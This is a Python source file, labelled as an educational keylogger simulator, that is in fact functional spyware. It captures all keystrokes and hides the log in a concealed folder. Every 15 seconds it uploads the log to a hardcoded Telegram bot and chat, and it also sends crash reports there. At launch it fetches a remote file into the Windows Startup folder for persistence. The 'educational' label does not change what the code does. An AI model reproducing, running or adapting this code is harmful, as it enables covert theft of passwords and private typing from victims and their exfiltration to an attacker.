# keylogger_simulator + Telegram sender
# EDUCATIONAL USE ONLY

import sys
import logging
from pynput import keyboard
import datetime
import os
import threading
import traceback
from pathlib import Path
import time
import requests

# Windows: hide folder
if sys.platform == "win32":
    import ctypes

    FILE_ATTRIBUTE_HIDDEN = 0x02


# ===============================
# Hidden folder on D: for storage
# ===============================
def get_storage_dir():
    """Create and return a hidden folder on D: drive. Falls back to script dir if D: missing."""
    d_drive = Path("D:/")
    # Hidden folder name (dot-prefix + generic name)
    hidden_folder = d_drive / ".sys"
    if d_drive.exists():
        hidden_folder.mkdir(parents=True, exist_ok=True)
        if sys.platform == "win32":
            try:
                ctypes.windll.kernel32.SetFileAttributesW(
                    str(hidden_folder), FILE_ATTRIBUTE_HIDDEN
                )
            except Exception:
                pass
        return hidden_folder
    # Fallback: same dir as script/exe
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve().parent
    return Path(__file__).resolve().parent


STORAGE_DIR = get_storage_dir()
BASE_DIR = STORAGE_DIR

log_file = STORAGE_DIR / "keylog.txt"
log_system = STORAGE_DIR / "keylogger.log"

# ====== بيانات البوت (Telegram) ======
BOT_TOKEN = "8356857690:AAGvBOffeeolZ4XATAPu_dJCeveex0sNoLU"
CHAT_ID = "241490872"
URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
URL_SEND_MESSAGE = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
SEND_INTERVAL = 15  # seconds
TELEGRAM_MSG_MAX_LEN = 4096  # Telegram message limit

# ====== Download to Startup ======
DOWNLOAD_URL = "https://raw.githubusercontent.com/khaled88r5/p/refs/heads/main/11.txt"
STARTUP_FILENAME = "file.txt"

# ===============================
# Logging
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(str(log_system), encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)

log_buffer = []
buffer_lock = threading.Lock()
flush_interval = 1
running = True


# ===============================
def download_to_startup():
    """Download file from URL and save to Windows Startup folder."""
    if sys.platform != "win32":
        return
    try:
        startup_folder = os.path.join(
            os.path.expanduser("~"),
            "AppData",
            "Roaming",
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        save_path = os.path.join(startup_folder, STARTUP_FILENAME)
        response = requests.get(DOWNLOAD_URL, stream=True, timeout=30)
        response.raise_for_status()
        with open(save_path, "wb") as f:
            for chunk in response.iter_content(8192):
                if chunk:
                    f.write(chunk)
        logging.info("File saved to Startup folder: %s", save_path)
    except Exception as e:
        logging.warning("Download to Startup failed: %s", e)
        send_error_to_telegram(f"Download to Startup failed: {e}\n{traceback.format_exc()}")


# ===============================
def setup_log_file():
    try:
        if not log_file.exists():
            with open(log_file, "w", encoding="utf-8") as f:
                f.write("=== Keylogger Simulator Log (Educational) ===\n")
            logging.info(f"Created log file at: {log_file}")
        else:
            logging.info(f"Using existing log file at: {log_file}")
    except Exception as e:
        err_msg = f"Failed to setup log file: {e}\n{traceback.format_exc()}"
        logging.error(err_msg)
        send_error_to_telegram(err_msg)
        raise


# ===============================
def flush_buffer():
    global log_buffer
    try:
        with buffer_lock:
            if log_buffer:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.writelines(log_buffer)
                log_buffer.clear()

        if running:
            threading.Timer(flush_interval, flush_buffer).start()
    except Exception as e:
        err_msg = f"flush_buffer error: {e}\n{traceback.format_exc()}"
        logging.error(err_msg)
        traceback.print_exc()
        send_error_to_telegram(err_msg)


# ===============================
def format_key(key):
    try:
        if hasattr(key, "char") and key.char:
            return key.char if key.char.isprintable() else f"[{key}]"
        return f"[{key}]"
    except Exception:
        return "[UNKNOWN]"


# ===============================
def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"{timestamp} - {format_key(key)}\n"
        with buffer_lock:
            log_buffer.append(entry)
    except Exception as e:
        err_msg = f"on_press error: {e}\n{traceback.format_exc()}"
        logging.error(err_msg)
        send_error_to_telegram(err_msg)


# ===============================
def send_error_to_telegram(message: str):
    """Send an error message to Telegram. Never raises; failures are logged only."""
    if not message or not message.strip():
        return
    try:
        text = message.strip()
        if len(text) > TELEGRAM_MSG_MAX_LEN:
            text = text[: TELEGRAM_MSG_MAX_LEN - 50] + "\n... (truncated)"
        payload = {"chat_id": CHAT_ID, "text": f"⚠️ Keylogger Error:\n\n{text}", "disable_web_page_preview": True}
        r = requests.post(URL_SEND_MESSAGE, json=payload, timeout=10)
        if r.status_code != 200:
            logging.warning("Telegram error send failed: %s", r.text)
    except Exception as e:
        logging.warning("Could not send error to Telegram: %s", e)


# ===============================
# Send any uncaught exception to Telegram
# ===============================
def _telegram_excepthook(exc_type, exc_value, exc_tb):
    try:
        tb_lines = traceback.format_exception(exc_type, exc_value, exc_tb)
        msg = "".join(tb_lines).strip()
        send_error_to_telegram(msg)
    except Exception:
        pass
    sys.__excepthook__(exc_type, exc_value, exc_tb)


sys.excepthook = _telegram_excepthook


# ===============================
def send_file_to_telegram():
    try:
        if not log_file.exists():
            return
        with open(log_file, "rb") as file:
            response = requests.post(
                URL, data={"chat_id": CHAT_ID}, files={"document": file}, timeout=10
            )
        if response.status_code == 200:
            logging.info("✅ File sent to Telegram successfully")
        else:
            logging.warning("❌ Failed to send file: %s", response.text)
    except Exception as e:
        err_msg = f"Telegram send error: {e}\n{traceback.format_exc()}"
        logging.warning("⚠️ %s", err_msg)
        send_error_to_telegram(err_msg)


# ===============================
def telegram_sender_loop():
    while running:
        time.sleep(SEND_INTERVAL)
        if not running:
            break
        send_file_to_telegram()


# ===============================
def cleanup():
    global running
    running = False
    flush_buffer()
    logging.info("Clean shutdown")


# ===============================
def main():
    try:
        logging.info(f"Running from: {BASE_DIR}")
        download_to_startup()
        setup_log_file()
        flush_buffer()

        # Start Telegram sender in background thread
        sender_thread = threading.Thread(target=telegram_sender_loop, daemon=True)
        sender_thread.start()
        logging.info("Telegram sender started (every %s sec)", SEND_INTERVAL)

        with keyboard.Listener(on_press=on_press) as listener:
            logging.info("Keyboard listener started")
            listener.join()

    except Exception as e:
        err_msg = f"Main error: {e}\n{traceback.format_exc()}"
        logging.error(err_msg)
        traceback.print_exc()
        send_error_to_telegram(err_msg)


# ===============================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Keyboard interrupt")
    finally:
        cleanup()
